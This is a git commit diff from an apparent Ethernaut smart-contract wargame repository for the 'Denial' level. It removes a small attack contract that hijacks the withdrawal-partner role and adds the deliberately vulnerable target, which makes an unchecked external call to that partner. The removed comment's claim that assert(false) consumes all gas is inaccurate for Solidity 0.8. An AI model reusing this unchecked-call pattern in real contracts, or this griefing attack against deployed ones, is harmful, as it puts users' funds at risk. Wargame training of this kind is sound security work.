dabaab1bee5238c190358d668ad1a11a0ea286c1
nicolasriverocorvalan <riveronicolas@gmail.com>
2024-06-06 18:40:25 -0300

    ethernaut

--- 20-Denial/src/Denial.sol
+++ 20-Denial/src/Denial.sol
@@ -1,26 +1,33 @@
 // SPDX-License-Identifier: MIT
-
 pragma solidity ^0.8.0;
 
-interface IDenial {
-    function setWithdrawPartner(address _partner) external;
-    function withdraw() external;
-}
+contract Denial {
+    address public partner; // withdrawal partner - pay the gas, split the withdraw
+    address public constant owner = address(0xA9E);
+    uint256 timeLastWithdrawn;
+    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances
 
-contract DenialAttack {
-    IDenial public denialContract;
-
-    constructor(address _denialContractAddress) {
-        denialContract = IDenial(_denialContractAddress);
+    function setWithdrawPartner(address _partner) public {
+        partner = _partner;
     }
 
-    function attack() public {
-        // Set this contract as the withdrawal partner
-        denialContract.setWithdrawPartner(address(this));
+    // withdraw 1% to recipient and 1% to owner
+    function withdraw() public {
+        uint256 amountToSend = address(this).balance / 100;
+        // perform a call without checking return
+        // The recipient can revert, the owner will still get their share
+        partner.call{value: amountToSend}("");
+        payable(owner).transfer(amountToSend);
+        // keep track of last withdrawal time
+        timeLastWithdrawn = block.timestamp;
+        withdrawPartnerBalances[partner] += amountToSend;
     }
 
-    // This function will consume all available gas
-    receive() external payable {
-        assert(false);
+    // allow deposit of funds
+    receive() external payable {}
+
+    // convenience function
+    function contractBalance() public view returns (uint256) {
+        return address(this).balance;
     }
 }
